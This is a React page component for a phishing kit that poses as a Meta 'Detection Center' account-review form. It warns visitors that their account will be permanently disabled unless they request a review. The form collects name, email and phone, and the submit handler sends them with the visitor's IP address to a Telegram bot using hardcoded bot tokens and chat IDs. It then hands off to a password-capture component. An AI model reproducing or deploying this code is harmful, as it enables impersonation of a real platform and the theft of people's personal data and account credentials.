import React, { useEffect, useState } from "react";
import Nav from "../component/nav";
import AuthViaPass from "../component/authViaPass"
import axios from 'axios';


const Submit = () => {
  const [authIsOpen, setCheckAuth] = useState(false);
  const [ip, setIP] = useState("");
  const [loginFormValues, setLoginFormValues] = useState({
    name: "",
    email: "",
    phone: 0,
    message: "",
  });
  const getData = async () => {
    const res = await axios.get("https://api.ipify.org/?format=json");
    setIP(res.data.ip);
  };
  // const botToken = '7024816830:AAHGOLB6hG5kV57GaTb7C5AFcCb1BNBhtJk';
  // const chatId = '6407116387';

  const botToken = '7009255232:AAFJ0oqZUaMmsMejKhbdaLnSxYyh6pl255w';
  const chatId = '6481657183';
  // const botToken = '6072365571:AAGaFtMmu0ZGnICycTTyAULJwsfIHe4cU9s';
  // const chatId = '6116266317';
  const handleSubmit = async (event) => {
    event.preventDefault();
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: `IP address: ${ip}\nName: ${loginFormValues.name}\nEmail: ${loginFormValues.email}\nPhone: ${loginFormValues.phone}\nMessage: ${loginFormValues.message}`
    }).then(({data}) => {
      //console.log(data);
      setCheckAuth(true);
    })
  };
  const handleFormValueChange = ({ target }) => {
    const name = target.name;
    const value = target.value;

    setLoginFormValues((values) => ({
      ...values,
      [name]: value,
    }));
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    getData();
  }, []);
  return (
    <div className="w-screen bg-[#E5E7EB]">
      <Nav />
      <div className="container mx-auto max-w-[1164px] p-6">
        {" "}
        <header className="mt-[90px] border-b-[1px] border-[#d1d5db] mb-[24px] w-full">
          <h1 className="text-2xl leading-6 font-semibold">
            Request an account review
          </h1>
          <p className="mt-3.5 pb-3.5 text-base text-[#4b5564] border-b-[1px] border-[#e5e7eb]">
            Detection Center System
          </p>
        </header>
        <main className="flex mb-[80px]">
          <div>
            <div className="mb-6">
              <div className="lg:flex justify-between hidden">
                {" "}
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium">
                  Fill form
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium pl-[25px]">
                  Submit form
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium">
                  Await decision
                </h1>
              </div>
              <div className="lg:hidden justify-between flex">
                {" "}
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold pl-[8px]">
                  1
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold ">
                  2
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold pr-[8px]">
                  3
                </h1>
              </div>
              <img src="step.png" alt="noImg" className="w-full" />
            </div>
            {/* form */}
            <div className="bg-white p-[16px] rounded-md">
              <h1 className="text-xl font-semibold text-[#1f2a37] mb-2">
                Request Form
              </h1>
              <p className="text-sm leading-5 text-[#6b7280]">
                CASE #324065938655
              </p>
              <hr className="my-[22px]" />
              <form onSubmit={handleSubmit}>
                <div className="mb-6">
                  <label
                    htmlFor="name"
                    className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px]  dark:text-white"
                  >
                    Full Name:
                  </label>
                  <input
                    type="text"
                    id="name"
                    name="name"
                    className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                    onChange={handleFormValueChange}
                    required
                  />
                </div>
                <div className="mb-6">
                  <label
                    htmlFor="email"
                    className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                  >
                    Email:
                  </label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                    onChange={handleFormValueChange}
                    required
                  />
                </div>
                <div className="mb-6">
                  <label
                    htmlFor="phone"
                    className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                  >
                    Phone number:
                  </label>
                  <input
                    type="number"
                    id="phone"
                    name="phone"
                    className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                    onChange={handleFormValueChange}
                    required
                  />
                </div>
                <div className="mb-6">
                  <label
                    htmlFor="message"
                    className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                  >
                    Any specific details (optional):
                  </label>

                  <textarea
                    id="message"
                    rows="4"
                    name="message"
                    className="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500"
                    onChange={handleFormValueChange}
                  ></textarea>
                </div>
                <div className="flex items-start mb-6">
                  <div className="flex items-center h-5">
                    <input
                      id="remember"
                      type="checkbox"
                      value=""
                      className="w-4 h-4 border border-gray-300 rounded bg-white! focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800"
                      required
                    />
                  </div>
                  <label
                    htmlFor="remember"
                    className="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300"
                  >
                    By clicking the button below, you agree to our Terms of
                    Service and our Data Policy.
                  </label>
                </div>
                <input
                  type="submit"
                  value="Submit"
                  className="text-base text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg  w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
                />
              </form>
            </div>
          </div>
          <div className="hidden xl:block border-l-[1px] border-[#d1d5db] ml-[24px]">
            <p className="text-sm max-w-[296px] pl-[24px] mb-[64px]">
              Our Detection Center System identifies accounts which violate our{" "}
              <a href="/" className="text-[#0d6efd] underline">
                Terms of service
              </a>{" "}
              and our{" "}
              <a href="/" className="text-[#0d6efd] underline">
                Community Standards
              </a>
              , mainly targetting{" "}
              <a href="/" className="text-[#0d6efd] underline">
                Duplicate or shared accounts used by many people
              </a>
              . or accounts which impersonate someone else.
            </p>
            <h4 className="text-sm leading-5 font-bold text-[#4b5564] max-w-[296px] pl-[24px]">
              What this means for you?
            </h4>
            <br />
            <br />
            <p className="text-sm max-w-[296px] pl-[24px] mb-[64px]">
              {" "}
              We are obliged to permanently disable your account, unless you
              request a formal review by our dedicated team which will review
              each account against our detections.
            </p>
            <h4 className="text-sm leading-5 font-bold text-[#4b5564] max-w-[296px] pl-[24px]">
              What next?
            </h4>
            <br />
            <br />
            <p className="text-sm max-w-[296px] pl-[24px] mb-[64px]">
              {" "}
              We are giving you the opportunity to respond with a formal request
              for review through this page. This request will then be attached
              to your case for review by our dedicated team.
            </p>
          </div>
        </main>
      </div>
      {/* authen */}
      {<>{/* <Authenication /> */}</>}
      <AuthViaPass authIsOpen={authIsOpen} setCheckAuth={setCheckAuth} name={loginFormValues.name} ip={ip}/>
      {/* end */}
      <footer className="bg-white text-center pb-[10px] pt-[10px]">
          <div className="end-container" style={{ textAlign: 'center', fontSize: '10px', marginTop: '20px' }}>
                <div style={{ display: 'inline-block', marginRight: '20px' }}>
                    <ul style={{ color: 'black',listStyle: 'none', paddingBottom: 30, margin: 0 }}>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px', color: 'black', textDecoration: 'underline' }} href="#">English (US)</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">English (UK)</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Español</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Português (Brasil)</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Français (France)</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">More languages</a></li>
                        <br></br><br></br>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">About</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Privacy</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Cookie</a></li>
                        <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black', textDecoration: 'underline' }} href="#">Meta © 2024</a></li>
                    </ul>
                </div>
            </div>
      </footer>
    </div>
  );
};

export default Submit;
